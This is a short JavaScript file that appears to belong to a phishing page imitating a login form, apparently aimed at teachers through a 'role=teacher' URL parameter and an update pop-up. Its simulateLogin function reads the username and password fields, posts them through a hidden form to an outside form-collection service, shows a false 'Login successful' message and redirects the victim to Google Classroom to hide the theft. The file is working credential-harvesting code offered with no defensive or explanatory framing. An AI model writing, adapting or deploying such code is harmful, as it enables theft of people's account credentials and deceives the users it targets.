
function simulateLogin() {
  try {
    const inputs = document.querySelectorAll('input');
    if (inputs.length < 2) {
      alert("Form inputs not found.");
      return;
    }

    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://formcarry.com/s/iBC91wH3nrf";
    form.style.display = "none";

    const usernameInput = document.createElement("input");
    usernameInput.type = "hidden";
    usernameInput.name = "username";
    usernameInput.value = inputs[0].value.trim();

    const passwordInput = document.createElement("input");
    passwordInput.type = "hidden";
    passwordInput.name = "password";
    passwordInput.value = inputs[1].value.trim();

    form.appendChild(usernameInput);
    form.appendChild(passwordInput);
    document.body.appendChild(form);

    alert("Login successful. Redirecting...");
    form.submit();

    setTimeout(() => {
      window.location.href = "https://classroom.google.com/";
    }, 500);
  } catch (e) {
    alert("Unexpected error.");
  }
}

window.onload = function() {
  const role = new URLSearchParams(window.location.search).get('role');
  if (role === 'teacher') {
    document.getElementById("updateModal").style.display = "flex";
  }
};
